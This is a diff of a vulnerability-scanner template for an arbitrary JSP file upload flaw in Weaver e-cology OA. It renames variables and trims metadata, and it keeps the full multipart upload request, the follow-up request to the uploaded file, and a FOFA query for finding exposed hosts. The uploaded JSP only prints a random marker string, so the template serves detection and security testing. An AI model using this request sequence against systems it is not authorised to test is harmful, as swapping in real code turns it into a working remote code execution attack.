@@ -1,19 +1,21 @@
-id: weaver-e-cology-uploadoperation-arbitrary-file-upload
+id: weaver-uploadoperation-file-upload
 
 info:
-  name: weaver e-cology uploadoperation.jsp arbitrary file upload
+  name: Weaver OA Workrelate - Arbitary File Upload
   author: SleepingBag945
   severity: critical
-  description: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
+  description: |
+    Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
   reference:
     - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 8.8
-    cwe-id: CWE-434
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/weaver-oa-workrelate-file-upload.yaml
   metadata:
     fofa-query: app="泛微-协同办公OA"
   tags: ecology,upload,fileupload,intrusive
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "{{randstr}}"
 
 http:
   - raw:
@@ -30,9 +32,9 @@ http:
 
         1
         ------WebKitFormBoundaryVdb2RRl25PuaGhWj
-        Content-Disposition: form-data; name="Filedata"; filename="{{randstr_1}}.jsp"
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.jsp"
 
-        <%out.println("{{randstr_2}}");%>
+        <%out.println("{{string}}");%>
         ------WebKitFormBoundaryVdb2RRl25PuaGhWj
         Content-Disposition: form-data; name="plandetailid"
 
@@ -54,11 +56,8 @@ http:
         ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
 
       - |
-        GET /{{randstr_1}}.jsp HTTP/1.1
+        GET /{{filename}}.jsp HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
-        Accept: */*
-        Accept-Encoding: gzip
 
     extractors:
       - type: regex
@@ -68,14 +67,11 @@ http:
         regex:
           - "&fileid=(.*?)\'>"
 
-    req-condition: true
     matchers-condition: and
     matchers:
       - type: dsl
         dsl: 
           - "status_code_1 == 200 && contains(body_1,'workrelate/plan/util/ViewDoc')"
-          - "contains(body_2, 'println') && status_code_2 == 200"
-          - "status_code_3 == 200 && contains(body_3,'{{randstr_2}}')"
+          - "status_code_2 == 200 && contains(body_2, 'println')"
+          - "status_code_3 == 200 && contains(body_3,'{{string}}')"
         condition: and
-
-# Enhanced by md on 2022/10/31
